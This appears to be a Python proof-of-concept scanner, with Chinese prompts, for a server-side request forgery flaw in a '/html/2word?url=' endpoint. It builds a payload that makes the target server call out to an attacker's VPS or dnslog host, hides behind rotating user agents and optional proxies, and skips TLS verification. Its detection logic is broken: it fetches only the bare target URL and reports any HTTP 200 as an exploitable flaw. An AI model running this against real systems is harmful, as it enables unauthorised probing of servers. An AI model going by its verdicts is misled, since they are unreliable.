import re
import requests
import random
import time
#from ResponseCache import RequestCache

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/58.0.3029.110 Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1",
    "Mozilla/5.0 (Android 7.1.1; SM-G930V Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2843.91 Mobile Safari/537.36"
]

def is_http_or_https(url):
    pattern = r'^https?://'
    return bool(re.match(pattern, url))

#主动通信 - 可选用使用代理
def fetch_url_with_proxy(url,proxy_url=None,proxy_auth=None,headers=None):

    default_headers = {
        "User-Agent":get_random_user_agent(),
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Accept-Encoding":"gzip, deflate",
        "Cache-Control":"max-age=0",
        "Proxy-Connection":"keep-alive",
        "Upgrade-Insecure-Requests":'1'
        }
    
    headers = default_headers

    if proxy_url != None:
        with requests.Session() as session:
            
            session.proxies = {
                "http":str(proxy_url),
                "https":str(proxy_url),
            }
            
            if proxy_auth is not None:
                session.auth = proxy_auth
            #HTTPS判断并进行跳过验证
            if is_http_or_https(url) == True:
                response = session.get(url,headers=headers,verify=False)
                time.sleep(1)
            else:
                response = session.get(url,headers=headers)
                time.sleep(1)
        return response.status_code
    else:
        if is_http_or_https(url) == True:
            response = requests.get(url,headers=headers,verify=False)
            time.sleep(1)
        else:
            response = requests.get(url,headers=headers)
            time.sleep(1)
        return response.status_code

def get_random_user_agent():
    return random.choice(USER_AGENTS)


def pocDetect(dnslog=None):
    payload = "/html/2word?url="  #http://your-ip/html/2word?url=http://your-vps-ip/malouKing.html;
    vps = "http://{dnslog}".format(dnslog=dnslog)
    if (dnslog==None or dnslog=="\n"):
        return payload
    elif(dnslog!=None):
        return (payload+vps)


if __name__ == '__main__':
    while True:
        #print("请选择是否使用代理进行通信")
        url = input("要检测的URL:")
        proxy_http = input("请输入您的代理地址(默认为空)：")
        dnslog = input("请输入接受回显dnslog地址(默认为空)：")
        pb = url+pocDetect(dnslog=dnslog)
        code = fetch_url_with_proxy(url,proxy_http)
        if code==200:
            print("o0o-漏洞存在,可进一步利用——>",pb)
        elif code!=200:
            print("o0o-POC发包检测漏洞不存在,若继续检测请手动验证")
        